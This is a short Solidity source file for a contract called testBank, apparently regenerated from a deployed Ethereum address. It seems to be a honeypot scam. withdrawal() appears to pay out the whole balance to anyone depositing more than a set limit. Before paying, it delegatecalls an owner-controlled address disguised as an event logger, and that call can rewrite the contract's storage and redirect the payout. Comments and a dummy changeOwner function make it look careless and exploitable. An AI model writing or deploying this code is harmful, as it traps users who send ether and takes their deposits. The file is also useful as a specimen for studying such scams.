/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract testBank at 0x60778cb37b76e1ccd8e05e25cf712ba5bda3217a
*/
pragma solidity 0.4.11;

contract testBank
{
    address Owner=0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
    address adr;
    uint256 public Limit= 1000000000000000001;
    address emails = 0x1a2c5c3ba7182b572512a60a22d9f79a48a93164;
    
    
    function Update(address dataBase, uint256 limit)
    {
        require(msg.sender == Owner); //checking the owner
        Limit = limit;
        emails = dataBase;
    }
    
    function changeOwner(address adr){
        // update Owner=msg.sender;
    }
    
    function()payable{}
    
    function withdrawal()
    payable public
    {
        adr=msg.sender;
        if(msg.value>Limit)
        {  
            //add if Owner
            emails.delegatecall(bytes4(sha3("logEvent()")));
            adr.send(this.balance);
        }
    }
    
    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }
    
}